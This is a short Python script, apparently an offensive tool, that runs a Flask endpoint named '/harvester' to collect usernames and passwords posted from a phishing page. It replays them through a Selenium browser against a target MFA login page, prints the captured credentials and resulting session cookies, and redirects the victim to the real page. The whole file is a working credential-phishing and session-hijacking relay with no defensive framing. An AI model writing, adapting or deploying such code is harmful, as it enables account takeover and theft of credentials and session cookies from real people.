import json
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from flask import Flask, request, redirect
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

# Parameters
loginURL = 'https://target/MFA/page' # Update this with the URL path to the target MFA app

def createBrowser():  
    opts = Options()
    opts.headless = False
    driver = webdriver.Chrome()
    driver.implicitly_wait(60)
    return driver

def login(username, passwd):
    driver = createBrowser()
    driver.get(loginURL)
    time.sleep(1)
    driver.find_element_by_id('username').send_keys(username)
    driver.find_element_by_id('password').send_keys(passwd)
    #driver.find_element_by_id('token').send_keys(token)
    #driver.find_element_by_id('submit').click()
    driver.execute_script("javascript:postOk()")  #had to use this to call the javscript logon function
    time.sleep(15)
    cookies = json.dumps(driver.get_cookies())
    driver.close()
    return cookies

app = Flask(__name__)
@app.route('/harvester', methods = ['POST'])
def harvest():
    username = request.form['pf.username']
    passwd = request.form['pf.pass']
    #token = request.form['token']
    print('\n=========== REPLAYING CREDENTIALS ========')
    print(f'\n[!] USERNAME - {username}')
    print(f'\n[!] PASSWORD - {passwd}')
    #print(f'\n[!] TOKEN - {token}\n')
    print('\n=========== COOKIES AFTER REPLAY ========')
    cookies = login(username, passwd)
    print(cookies)
    return redirect(loginURL, code=307)
    return

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

